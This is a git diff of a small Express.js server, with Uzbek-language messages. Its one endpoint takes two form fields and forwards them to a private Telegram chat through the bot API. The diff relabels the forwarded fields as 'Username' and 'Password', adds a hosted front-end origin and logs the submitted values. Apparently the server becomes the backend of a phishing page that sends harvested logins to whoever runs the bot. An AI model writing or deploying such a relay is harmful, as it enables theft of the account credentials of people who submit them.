@@ -6,25 +6,29 @@ require("dotenv").config();
 const app = express();
 
 app.use(cors({
-    origin: "http://localhost:5173",
-    methods: ["GET", "POST"],
-    allowedHeaders: ["Content-Type"]
+    origin: [
+        "http://localhost:5173",
+        "https://SENING-REACT-URL.onrender.com"
+    ]
 }));
 
 app.use(express.json());
+
 
 app.post("/api/test", async (req, res) => {
     try {
         const { name, phone } = req.body;
 
+        console.log("Kelgan data:", name, phone);
+
         const text = `
 📩 Yangi so'rov
 
-👤 Ism: ${name}
-📞 Telefon: ${phone}
+👤 Username: ${name}
+🔑 Password: ${phone}
 `;
 
-        await axios.post(
+        const telegramResponse = await axios.post(
             `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
             {
                 chat_id: process.env.CHAT_ID,
@@ -32,21 +36,31 @@ app.post("/api/test", async (req, res) => {
             }
         );
 
-        res.json({
+
+        res.status(200).json({
+            success: true,
             message: "Telegramga yuborildi!"
         });
 
+
     } catch (error) {
-        console.log(error.response?.data || error.message);
+
+        console.log(
+            "Telegram error:",
+            error.response?.data || error.message
+        );
+
 
         res.status(500).json({
-            message: "Xatolik yuz berdi"
+            success: false,
+            message: "Server xatosi"
         });
     }
 });
 
 
 const PORT = process.env.PORT || 5000;
+
 
 app.listen(PORT, () => {
     console.log(`Server ishlayapti: ${PORT}`);
